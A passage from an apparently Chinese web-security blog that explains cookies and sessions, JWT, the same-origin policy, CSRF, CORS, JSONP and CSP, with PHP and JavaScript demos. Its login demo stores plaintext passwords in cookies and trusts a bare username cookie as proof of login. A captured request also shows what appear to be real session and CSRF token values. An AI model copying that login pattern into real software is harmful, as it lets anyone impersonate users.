&lt;li&gt; &lt;label for&quot;&quot;&gt; &lt;&#x2F;label&gt; &lt;input type&#x3D;&quot;checkbox&quot; name&#x3D;&quot;remember&quot; value&#x3D;&quot;yes&quot;&#x2F;&gt;7天内自动登录 &lt;&#x2F;li&gt; &lt;li&gt; &lt;label for&quot;&quot;&gt; &lt;&#x2F;label&gt; &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;login&quot; value&#x3D;&quot;登录&quot; class&#x3D;&quot;login_btn&quot;&#x2F;&gt; &lt;&#x2F;li&gt; &lt;&#x2F;ul&gt; &lt;&#x2F;fieldset&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; Login.php 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?php header(&quot;Content-Type:text&#x2F;html;charset&#x3D;utf-8&quot;); session_start(); if(isset($_POST[&#39;login&#39;])) &#123; $username &#x3D; trim($_POST[&#39;username&#39;]); $password &#x3D; trim($_POST[&#39;password&#39;]); if(($username&#x3D;&#x3D;&#39;&#39;)||($password&#x3D;&#x3D;&#39;&#39;)) &#123; header(&#39;refresh:3;url&#x3D;login.html&#39;); echo &quot;改用户名或密码不能为空，3秒后跳转到登录页面&quot;; exit; &#125; else if(($username!&#x3D;&#39;username&#39;)||($password!&#x3D;&#39;password&#39;)) &#123; &#x2F;&#x2F;用户名或密码错误 header(&#39;refresh:3;url&#x3D;login.html&#39;); echo &quot;用户名或密码错误，3秒后跳转到登录页面&quot;; exit; &#125; else if(($username&#x3D;&#x3D;&#39;username&#39;)&amp;&amp;($password&#x3D;&#x3D;&#39;password&#39;)) &#123; &#x2F;&#x2F;登录成功将信息保存到session中 $_SESSION[&#39;username&#39;]&#x3D;$username; $_SESSION[&#39;islogin&#39;]&#x3D;1; &#x2F;&#x2F;如果勾选7天内自动保存，则将其保存到cookie if($_POST[&#39;remember&#39;]&#x3D;&#x3D;&quot;yes&quot;) &#123; setcookie(&quot;username&quot;,$username,time()+7*24*60*60); setcookie(&quot;code&quot;,$password,time()+7*24*60*60); &#125; else &#123; setcookie(&quot;username&quot;,&#39;&#39;,time()-1); setcookie(&quot;code&quot;,&#39;&#39;,time()-1); &#125; &#x2F;&#x2F;跳转到用户首页 header(&#39;refresh:3;url&#x3D;index.php&#39;); &#125; &#125; ?&gt; Index.php 1234567891011121314151617181920&lt;?php header(&quot;Content-Type:text/html;charset=utf-8&quot;); session_start(); //首先判断Cookie是否有记住用户信息 if(isset($_COOKIE[&#x27;username&#x27;])) &#123; $_SESSION[&#x27;username&#x27;]=$_COOKIE[&#x27;username&#x27;]; $_SESSION[&#x27;islogin&#x27;]=1; &#125; if(isset($_SESSION[&#x27;islogin&#x27;])) &#123; //已经登录 echo $_SESSION[&#x27;username&#x27;].&quot;:你好，欢迎进入个人中心！&lt;br/&gt;&quot;; echo &quot;&lt;a href=&#x27;logout.php&#x27;&gt;注销&lt;/a&gt;&quot;; &#125; else &#123; //为登录 echo &quot;你还未登录，请&lt;a href=&#x27;login.html&#x27;&gt;登录&lt;/a&gt;&quot;; &#125; ?&gt; Logout.php 12345678910111213&lt;?php header(&quot;Content-Type:text/html;charset=utf-8&quot;); session_start(); //清除session $username=$_SESSION[&#x27;username&#x27;]; $_SESSION=array(); session_destroy(); //清除cookie setcookie(&quot;username&quot;,&#x27;&#x27;,time()-1); setcookie(&quot;code&quot;,&#x27;&#x27;,time()-1); echo &quot;$username,欢迎下次光临&quot;; echo &quot;重新&lt;a href=&#x27;login.html&#x27;&gt;登录&lt;/a&gt;&quot;; ?&gt; 第一次请求(不记住我)请求包没有携带任何的cookie信息 1234567891011121314POST /upload/login.php HTTP/1.1Host: 127.0.0.1:8888User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 60Origin: http://127.0.0.1:8888Connection: closeReferer: http://127.0.0.1:8888/upload/login.htmlUpgrade-Insecure-Requests: 1username=username&amp;password=password&amp;login=%E7%99%BB%E5%BD%95 响应包1234567891011121314HTTP/1.1 200 OKDate: Thu, 19 Nov 2020 06:25:52 GMTServer: ApacheX-Powered-By: PHP/5.6.40Set-Cookie: PHPSESSID=4ac995bf20318bd2e6e30fc39f443db7; path=/Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0Pragma: no-cacheSet-Cookie: username=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0Set-Cookie: code=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0refresh: 3;url=index.phpConnection: closeContent-Type: text/html;charset=utf-8Content-Length: 0 可以看到返回一个phpsessionid给服务端。 对应源码中的 12$_SESSION[&#x27;username&#x27;]=$username; $_SESSION[&#x27;islogin&#x27;]=1; 而且可以看到由于我们没有选择记住我功能，cookie的有效时间几乎不存在。对应源码 12setcookie(&quot;username&quot;,&#x27;&#x27;,time()-1); setcookie(&quot;code&quot;,&#x27;&#x27;,time()-1); 成功登录之后再一次访问，可以看到请求头带上了sessionid，但是并没有带上有关用户信息的cookie，因为我们设置了cookie有效时间为0。 123456789GET /upload/index.php HTTP/1.1Host: 127.0.0.1:8888User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: PHPSESSID=509db33ae5e271f27d4cfa29e3071499Upgrade-Insecure-Requests: 1 第二次请求(记住我功能)请求包同理第一次访问没有sessionid。 1234567891011121314POST /upload/login.php HTTP/1.1Host: 127.0.0.1:8888User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 73Origin: http://127.0.0.1:8888Connection: closeReferer: http://127.0.0.1:8888/upload/login.htmlUpgrade-Insecure-Requests: 1username=username&amp;password=password&amp;remember=yes&amp;login=%E7%99%BB%E5%BD%95 响应包返回sessionid，并且cookie的有效性设置为7天。 1234567891011121314HTTP/1.1 200 OKDate: Thu, 19 Nov 2020 06:39:02 GMTServer: ApacheX-Powered-By: PHP/5.6.40Set-Cookie: PHPSESSID=059286111d278a766e78d25a7acb2aa6; path=/Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0Pragma: no-cacheSet-Cookie: username=username; expires=Thu, 26-Nov-2020 06:39:02 GMT; Max-Age=604800Set-Cookie: code=password; expires=Thu, 26-Nov-2020 06:39:02 GMT; Max-Age=604800refresh: 3;url=index.phpConnection: closeContent-Type: text/html;charset=utf-8Content-Length: 0 登录成功之后再次访问该页面 123456789GET /upload/index.php HTTP/1.1Host: 127.0.0.1:8888User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: username=username; code=password; PHPSESSID=6a8a5ebf3eb4438284167ed3a98d17b5Upgrade-Insecure-Requests: 1 可以看到cookie中携带者有关用户登录的信息，因为我们在设置cookie的时候cookie有效性为7天。 12setcookie(&quot;username&quot;,$username,time()+7*24*60*60); setcookie(&quot;code&quot;,$password,time()+7*24*60*60); 最后我们直接访问index.php发现可以不用输入密码账户即可登录成功，原因就是cookie已经存在于本地，并且有效时间为7天。 而且我们在index页面中对cookie中的内容进行了判断。 12345if(isset($_COOKIE[&#x27;username&#x27;])) &#123; $_SESSION[&#x27;username&#x27;]=$_COOKIE[&#x27;username&#x27;]; $_SESSION[&#x27;islogin&#x27;]=1; &#125; session与cookie的区别Cookies是服务器在本地机器上存储的小段文本并随每一个请求发送至同一个服务器 网络服务器用HTTP头向客户端发送cookies，在客户终端，浏览器解析这些cookies并将它们保存为一个本地文件，它会自动将同一服务器的任何请求缚上这些cookies 。 cookie的作用就是为了解决HTTP协议无状态的缺陷所作的努力。 服务器通过在HTTP的响应头中加上一行特殊的指示以提示浏览器按照指示生成相应的cookie。然而纯粹的客户端脚本如JavaScript也可以生成cookie。 cookie的使用是由浏览器按照一定的原则在后台自动发送给服务器的 session机制是一种服务器端的机制，session由服务端生成，每一个session对应一个session id，session id将被在本次响应中返回给客户端保存，可以保存在cookie中。 1、存储方式不同 Cookie中只能保管ASCII字符串 Session中能够存取任何类型的数据 2、隐私策略的不同 Cookie存储在客户端阅读器中，对客户端是可见的，客户端的一些程序可能会窥探、复制以至修正Cookie中的内容。 Session存储在服务器上，对客户端是透明的，不存在敏感信息泄露的风险 3、跨域支持上的不同 Cookie支持跨域名访问 Session仅在他所在的域名内有效 4、cookie数据存放在客户的浏览器（客户端）上，session数据放在服务器上，但是服务端的session的实现对客户端的cookie有依赖关系的； 5、cookie不是很安全，别人可以分析存放在本地的COOKIE并进行COOKIE欺骗，考虑到安全应当使用session； session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能。考虑到减轻服务器性能方面，应当使用COOKIE； 6、单个cookie在客户端的限制是3K，就是说一个站点在客户端存放的COOKIE不能超过3K； 什么是cookie？Cookie是客户端保存用户信息的一种机制，用来记录用户的一些信息，实际上Cookie是服务器在本地机器上存储的一小段文本，并随着每次请求发送到服务器。 cookie如何生成？1、由服务端生成，在返回包中的set-cookie选项设置cookie。 2、前端浏览器通过js设置cookie。 什么是session？Session 代表着服务器和客户端一次会话的过程，Session 对象存储特定用户会话所需的属性及配置信息。 客户端浏览器访问服务器的时候，服务器把客户端信息以某种形式记录在服务器上，这就是session。 session的缺陷 session都是保存在内存中，而随着认证用户的增多，服务端的开销会明显增大。 cookie来进行用户识别的, cookie如果被截获，用户就会很容易受到跨站请求伪造的攻击。 session与cookie的关系用户第一次请求服务器的时候，服务器根据用户提交的相关信息，创建创建对应的 Session ，请求返回时将此 Session 的唯一标识信息 SessionID 返回给浏览器，浏览器接收到服务器返回的 SessionID 信息后，会将此信息存入到 Cookie 中，同时 Cookie 记录此 SessionID 属于哪个域名。 当用户第二次访问服务器的时候，请求会自动判断此域名下是否存在 Cookie 信息，如果存在自动将 Cookie 信息也发送给服务端，服务端会从 Cookie 中获取 SessionID，再根据 SessionID 查找对应的 Session 信息，如果没有找到说明用户没有登录或者登录失效，如果找到 Session 证明用户已经登录可执行后面操作。 根据以上流程可知，SessionID 是连接 Cookie 和 Session 的一道桥梁，大部分系统也是根据此原理来验证用户登录状态。 什么是JWT？JWT的构成第一部分我们称它为头部（header),第二部分我们称其为载荷（payload, 类似于飞机上承载的物品)，第三部分是签证（signature)。 header jwt的头部承载两部分信息： 声明类型，这里是jwt 声明加密的算法 通常直接使用 HMAC SHA256 完整的头部就像下面这样的JSON： 1234&#123; &#39;typ&#39;: &#39;JWT&#39;, &#39;alg&#39;: &#39;HS256&#39;&#125; 然后将头部进行base64加密（该加密是可以对称解密的),构成了第一部分. 1eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 playload 载荷就是存放有效信息的地方。这个名字像是特指飞机上承载的货品，这些有效信息包含三个部分 标准中注册的声明 公共的声明 私有的声明 标准中注册的声明 (建议但不强制使用) ： iss: jwt签发者 sub: jwt所面向的用户 aud: 接收jwt的一方 exp: jwt的过期时间，这个过期时间必须要大于签发时间 nbf: 定义在什么时间之前，该jwt都是不可用的. iat: jwt的签发时间 jti: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击。 公共的声明 ： 公共的声明可以添加任何的信息，一般添加用户的相关信息或其他业务需要的必要信息.但不建议添加敏感信息，因为该部分在客户端可解密. 私有的声明 ： 私有声明是提供者和消费者所共同定义的声明，一般不建议存放敏感信息，因为base64是对称解密的，意味着该部分信息可以归类为明文信息。 定义一个payload: 12345&#123; &quot;sub&quot;: &quot;1234567890&quot;, &quot;name&quot;: &quot;John Doe&quot;, &quot;admin&quot;: true&#125; 然后将其进行base64加密，得到Jwt的第二部分。 1eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9 signature jwt的第三部分是一个签证信息，这个签证信息由三部分组成： header (base64后的) payload (base64后的) secret 这个部分需要base64加密后的header和base64加密后的payload使用.连接组成的字符串，然后通过header中声明的加密方式进行加盐secret组合加密，然后就构成了jwt的第三部分。 1234// javascriptvar encodedString = base64UrlEncode(header) + &#x27;.&#x27; + base64UrlEncode(payload);var signature = HMACSHA256(encodedString, &#x27;secret&#x27;); // TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ 将这三部分用.连接成一个完整的字符串,构成了最终的jwt: 1eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ 注意：secret是保存在服务器端的，jwt的签发生成也是在服务器端的，secret就是用来进行jwt的签发和jwt的验证，所以，它就是你服务端的私钥，在任何场景都不应该流露出去。一旦客户端得知这个secret, 那就意味着客户端是可以自我签发jwt了。 JWT优点 JWT是可以进行跨语言支持的，像JAVA,JavaScript,NodeJS,PHP等很多语言都可以使用。 jwt的构成非常简单，字节占用很小，所以它是非常便于传输的。 不需要在服务端保存会话信息, 所以它易于应用的扩展 注意 不应该在jwt的payload部分存放敏感信息，因为该部分是客户端可解密的部分。 保护好secret私钥，该私钥非常重要。","categories":[{"name":"前端安全","slug":"前端安全","permalink":"http://s1eady.top/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Cookie与Session","slug":"Cookie与Session","permalink":"http://s1eady.top/tags/Cookie%E4%B8%8ESession/"}]},{"title":"同源策略与CSP","slug":"同源策略与CSP","date":"2019-01-10T12:11:17.000Z","updated":"2020-10-16T11:46:27.581Z","comments":true,"path":"2019/01/10/同源策略与CSP/","link":"","permalink":"http://s1eady.top/2019/01/10/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E4%B8%8ECSP/","excerpt":"","text":"同源策略什么是跨域?域:域是windows网络操作系统的逻辑组织单元,也是internet的逻辑组织单元.他是安全边界 只有域的所有者才能有权利去管理或者访问域内部的资源,若其他域要访问或者管理,则需要该域赋予其他域的相关权限。 网页跨域是指一个域下的文档或脚本试图去请求另一个域下的资源。 同源策略同源是指域名、协议、端口相同 浏览器的同源策略主要有两个: DOM的同源策略:禁止对不同源页面的DOM元素进行操作,主要是在inframe标签加载跨域页面出现 XmlHttpRequests同源策略:禁止XHR对象对不同的源地址发起请求 存储在浏览器中的数据，如localStroage、Cooke和IndexedDB不能通过脚本跨域访问 Dom 同源策略Dom同源策略主要是防止你通过iframe标签引入恶意的网页,该网页能够窃取当前网站的cookie等重要信息,之所以是Dom同源策略,就是我们可以操作Dom来拿到重要信息,比如操作Dom元素拿到目标网站中的input标签中的内容，内容可能是密码、账号。 我们来看一个例子: 12345678 &lt;head&gt; &lt;title&gt;Siam - Dom同源策略&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;iframe src&#x3D;&quot;http:&#x2F;&#x2F;www.alipay.com&quot;&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; www.steady.com网站中嵌入了iframe标签引入了支付宝的网站.执行的时候我们发现，他拒绝了支付宝页面的展示,原因是没有设置请求头---X-Frame-Options,主要原因就是不同源(sameorigin) X-Frame-Options 是一个HTTP标头（header），用来告诉浏览器这个网页是否可以放在iFrame内。 123X-Frame-Options: DENY &#x2F;&#x2F; 不允许iframeX-Frame-Options: SAMEORIGIN &#x2F;&#x2F; 只允许同源的网站iframeX-Frame-Options: ALLOW-FROM [http:&#x2F;&#x2F;yancoo.cn&#x2F;](https:&#x2F;&#x2F;links.jianshu.com&#x2F;go?to&#x3D;http%3A%2F%2Fyancoo.cn%2F) &#x2F;&#x2F; 只允许指定网站iframe XMLHttpRequest 同源策略XHR主要是防止获取用户cookie,防止攻击者进行跨站请求伪造 跨站请求原理: 1、用户登陆网站A,先要填写用户名、密码等cookie信息.然后信息保存在浏览器中 2、用户访问恶意网站B,(不知情的情况下)执行恶意网站的某些操作,而该操作会带上用户在浏览器端的cookie信息 去执行一些非法操作 3、站点A根据请求所带的cookie,判断该用户为合法的A用户,成功实现攻击者的目的 同源检测Origin Header具体流程 当一个链接或者XMLHttpRequest去请求跨域操作，浏览器事实上的确向目标服务器发起了连接请求，并且携带这origin。 请求首部字段 Origin 指示了请求来自于哪个站点。该字段仅指示服务器名称，并不包含任何路径信息。除了不包含路径信息（不包含path及query），该字段与 Referer 首部字段相似。 Referer Header具体流程 在发起请求前，调用window.localtion获取window.location.href获取当前地址栏中的请求地址 将该地址附加到referrer域中 判断请求头中的Referer字段，比如： 12345678910GET /pheapi/article/dir/89489609 HTTP/1.1Host: blog.csdn.netUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: https://blog.csdn.net/qq_36119192/article/details/89489609X-Requested-With: XMLHttpRequestX-Tingyun-Id: im-pGljNfnc;r=901833252Connection: close 以上场景出现在用户从https://blog.csdn.net/qq_36119192/article/details/89489609访问/pheapi/article/dir/89489609，目的页面可以通过请求头中的referer字段来判断是否是跨域请求。 两者区别origin只有发生跨域请求或者同域的post请求时候才会有。 referer不论何种情况下，只要浏览器能获取到请求源都会携带，携带着url的很多参数信息，而这些信息实际上是隐私的，但是外部网站都可以看到这些数据。 补天平台登录请求头 12345678910111213POST /user/sign-in?next=https://www.butian.net/Home/login/loginBack HTTP/1.1Host: user.butian.netUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0Accept: application/jsonAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/json; charset=UTF-8Content-Length: 208//可以看到referer没有带上path和queryOrigin: https://user.butian.netConnection: closeReferer: https://user.butian.net/user/sign-in?next=https://www.butian.net/login.html&amp;style=1Cookie: next=&quot;https%3A//www.butian.net/login.html&quot;; __q__=1601903202954; csrf_token=1601906836##158ab5b128d3781965424a7ece2f6cbe318bcf8f; style=1; User-Center=b8a5b564-f158-4af1-977d-6adf7105c2c9; btlc_ba52447ea424004a7da412b344e5e41a=e063dd212b16f71c690e97fa9aeaafc404be29448327bf57a72e50f675893d27 跨域的解决方法CORS 跨域解决它允许浏览器向跨源服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制。 实现CORS通信的关键是服务器。只要服务器实现了CORS接口，就可以跨源通信。CORS的请求操作由浏览器自动执行,关键就是服务端的配置,来检测是否允许客户端进行访问。 CORS的原理: 使用http自定义头,请求头带上客户端的信息,服务端进行验证,返回响应信息告诉客户端目标资源是否允许被访问 两种请求简单请求必须同时满足以下两个条件的请求，才是简单请求 请求方法只能是在以下三种之中： 123GETPOSTHEAD HTTP的头信息不超出以下几种字段： 12345AcceptAccept-LanguageContent-LanguageLast-Event-IDContent-Type 只限于三个值 application&#x2F;x-www-form-urlencoded、multipart&#x2F;form-data、text&#x2F;plain 凡是不同时满足上面两个条件，就属于非简单请求。 非简单请求在发送真正请求之前，会先发送一次预检请求，来判断服务端是否支持非简单请求的类方法。预检通过之后，浏览器会再次使用真实请求方法发起请求 “预检”请求用的请求方法是OPTIONS，表示这个请求是用来询问的。头信息里面，关键字段是Origin，表示请求来自哪个源。 除了Origin字段，”预检”请求的头信息包括两个特殊字段。 Access-Control-Request-Method 该字段是必须的，用来列出浏览器的CORS请求会用到哪些HTTP方法，上例是PUT。 Access-Control-Request-Headers 该字段是一个逗号分隔的字符串，指定浏览器CORS请求会额外发送的头信息字段，上例是X-Custom-Header。 三个与CORS请求相关的字段1234Access-Control-Allow-Origin: http://api.bob.comAccess-Control-Allow-Credentials: trueAccess-Control-Expose-Headers: FooBarContent-Type: text/html; charset=utf-8 Access-Control-Allow-Origin该字段是必须的，它的值要么是请求时Origin字段的值，要么是一个*，表示接受任意域名的请求。 Access-Control-Allow-Credentials该字段可选，它的值是一个布尔值，表示是否允许发送Cookie。设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。 Access-Control-Expose-Headers该字段可选。CORS请求时，XMLHttpRequest对象的getResponseHeader()方法只能拿到6个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想拿到其他字段，就必须在Access-Control-Expose-Headers里面指定。上面的例子指定，getResponseHeader(&#39;FooBar&#39;)可以返回FooBar字段的值。 实践简单请求两个网站—www.siam.com和www.siam2.com sim向sim2发起请求 sim网站如下,使用ajax请求sim2: 1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;首页1&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;这是原始页面的内容&lt;/h1&gt; &lt;script src=&quot;https://cdn.bootcss.com/jquery/3.4.0/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script&gt; $(function()&#123; $.ajax(&#123; url : &quot;http://www.siam2.com/index2.php&quot;, success:function(res)&#123; $(&#x27;body&#x27;).html(res); &#125; &#125;) &#125;) &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; sim2: 12&lt;?phpecho &quot;来自index2.php的内容&quot;; 访问sim2的时候: 1(index):1 Access to XMLHttpRequest at ‘[http://www.siam2.com/index2.php](http://www.siam2.com/index2.php)‘ from origin ‘[http://siam.com](http://siam.com/)‘ has been blocked by CORS policy: No ‘Access-Control-Allow-Origin’ header is present on the requested resource. 很明显不允许进行跨域 因为我们的服务端–sim2没有进行相应的设置,接下来我们进行一下相应的设置: 响应头中增加字段，来添加信任站点的域名 123&lt;?phpheader(&#x27;Access-Control-Allow-Origin:http://www.siam.com&#x27;);echo &quot;来自index2.php的内容&quot;; 这里就跨域请求成功了。 非简单请求因为简单请求必须是HEAD，GET，POST其一，所以我们这里直接使用PUT方法来测试就可以出现非简单请求的场景了。 当然你也可以自定义HTTP头部来实现非简单请求。 我们把index.html的ajax方法改为put 然后请求 1234567$.ajax(&#123; url : &quot;http://www.siam2.com/index2.php&quot;, type: &quot;PUT&quot;, success:function(res)&#123; $(&#x27;body&#x27;).html(res); &#125;&#125;) 可以看到在请求中，我们填的是PUT，但是这里产生的却是OPTIONS，前面我们也说了，非简单请求会先产生一次预检请求，带上origin和真实的方法在这里是PUT，服务端验证通过了origin和方法之后，浏览器才会使用真实的方法PUT发送一次请求。 我们还没有在服务端返回头部告诉浏览器说我们支持PUT方法，所以浏览器这里拿不到权限，报错了。 我们在服务端的代码添加头部 1234&lt;?phpheader(&#x27;Access-Control-Allow-Origin:http://www.siam.com&#x27;);header(&#x27;Access-Control-Allow-Methods:PUT,DELETE&#x27;); // 需要同意两种类型，就用逗号隔开echo &quot;来自index2.php的内容&quot;; 到这里就可以正常的请求了，但是可以在浏览器中看到，产生了两次请求，也就是说php脚本执行了两次。 我们例子中只是简单输出一个字符，如果是查询数据库等操作呢？ 是不是就多出了一次无用的请求。 所以我们可以在服务端拦截预检请求，直接返回同意访问的头部，后面的脚本就不需要执行了。 还有前面的简单请求，哪怕是还没有添加信任，跨域请求失败，脚本也一样会运行。 1这是因为http协议并没有跨域的概念，请求发送了就会执行，而到达了浏览器的时候，才由浏览器解析响应头，查看是否有相应的字段来决定要不要继续执行。 123456789101112&lt;?php// 如果不是同意的来源 就不用运行了if (strpos($_SERVER[&#x27;HTTP_ORIGIN&#x27;], &#x27;http://www.siam.com&#x27;) === false)&#123; die;&#125;header(&#x27;Access-Control-Allow-Origin:http://www.siam.com&#x27;);// 如果是预检请求，则通知信任即可，不需要执行脚本。if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;OPTIONS&#x27;)&#123; header(&#x27;Access-Control-Allow-Methods:PUT,DELETE&#x27;); die;&#125;echo &quot;来自index2.php的内容&quot;; 总的意思就是请求不是同意的来源以及请求是预检测我都不执行脚本 同时我们可以看一下，是否每一个非简单请求都需要先发送预检请求。我们在一个页面连续请求两次 1234567891011121314$.ajax(&#123; url : &quot;http://www.siam2.com/index2.php&quot;, type: &quot;PUT&quot;, success:function(res)&#123; $(&#x27;body&#x27;).html(res); $.ajax(&#123; url : &quot;http://www.siam2.com/index2.php&quot;, type: &quot;PUT&quot;, success:function(res)&#123; $(&#x27;body&#x27;).html(res); &#125; &#125;) &#125;&#125;) 发现浏览器只有请求了3次：1次OPTIONS，2次PUT。 1在一个页面中，预检操作只需要进行一次。 12345优点CORS 通信与同源的 AJAX 通信没有差别，代码完全一样，容易维护。支持所有类型的 HTTP 请求。缺点第一次发送非简单请求时会多一次请求，增加服务器压力。 JSONP 跨域解决通过script标签引入一个js文件，这个js文件载入成功后会执行我们在url参数中指定的函数，并且会把我们需要的json数据作为参数传入。 1234567&lt;script src=&quot;http://steady.com/data.php?callback=steady&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt; function steady(jsondata)&#123; //处理获得的json数据 &#125;&lt;/script&gt; 首先我们在html中写下以下代码，创建一个script，调用动态脚本 12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;Siam - script 同源解决&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;这是原始页面的内容&lt;/h1&gt; &lt;script src=&quot;https://cdn.bootcss.com/jquery/3.4.0/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script&gt; // 这里需要先写好相应的回调处理函数，然后服务端的脚本调用 传参 function test(text)&#123; $(&#x27;body&#x27;).append(text); &#125; $(function()&#123; $(&quot;body&quot;).append(&quot;&lt;script src=&#x27;http://www.siam2.com/script.php&#x27;&gt;&lt;\\/script&gt;&quot;); &#125;) &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 服务端脚本: 123&lt;?phpecho &quot;test(&#39;这是返回内容&#39;)&quot;;?&gt; 优点： 1它不像XMLHttpRequest对象实现的Ajax请求那样受到同源策略的限制；它的兼容性更好，在更加古老的浏览器中都可以运行，不需要XMLHttpRequest或ActiveX的支持；并且在请求完毕后可以通过调用callback的方式回传结果。 缺点： 1它只支持&#96;GET&#96;请求而不支持POST等其它类型的HTTP请求；它只支持跨域HTTP请求这种情况，不能解决不同域的两个页面之间如何进行JavaScript调用的问题。 服务器代理除了使用以上的两种方案，我们还可以在nginx配置反向代理，在www.siam.com下某个路径代理到www.siam2.com即可 我们打开nginx.conf 12345678910111213server &#123; listen 80; server_name www.siam.com; #charset koi8-r; #access_log logs/host.access.log main; location / &#123; root html; index index.html index.htm; &#125; location ^~ /apis &#123; proxy_pass http://www.siam2.com; &#125;&#125; 通过反向代理，我们就可以通过 www.siam.com/apis/index2.php 这个路径来访问原来部署在www.siam2.com下的内容。 这样子就是同源请求了。 CSP概念​ CSP全称Content Security Policy ,可以直接翻译为内容安全策略,为了页面内容安全而制定的一系列防护策略. 通过CSP所约束的的规则,指定可信的内容来源（这里的内容可以指脚本、图片、iframe、fton、style等等可能的远程的资源），明确告诉客户端，哪些外部资源可以加载和执行。通过CSP协定，让WEB处于一个安全的运行环境中。 设置方式Content-Security-Policy一种是通过 HTTP 头信息的Content-Security-Policy的字段。 12Content-Security-Policy: script-src &#39;self&#39;; object-src &#39;none&#39;;style-src cdn.example.org third-party.org; child-src https: &lt;meta&gt;1&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#x27;self&#x27;; object-src &#x27;none&#x27;; style-src cdn.example.org third-party.org; child-src https:&quot;&gt; 上面代码中，CSP 做了如下配置。 12345脚本：只信任当前域名&lt;object&gt;标签：不信任任何URL，即不加载任何资源样式表：只信任cdn.example.org和third-party.org框架（frame）：必须使用HTTPS协议加载其他资源：没有限制 策略指令 指令 说明 default-src 定义资源默认加载策略 connect-src 定义 Ajax、WebSocket 等加载策略 font-src 定义 Font 加载策略 frame-src 定义 Frame 加载策略 img-src 定义图片加载策略 media-src 定义 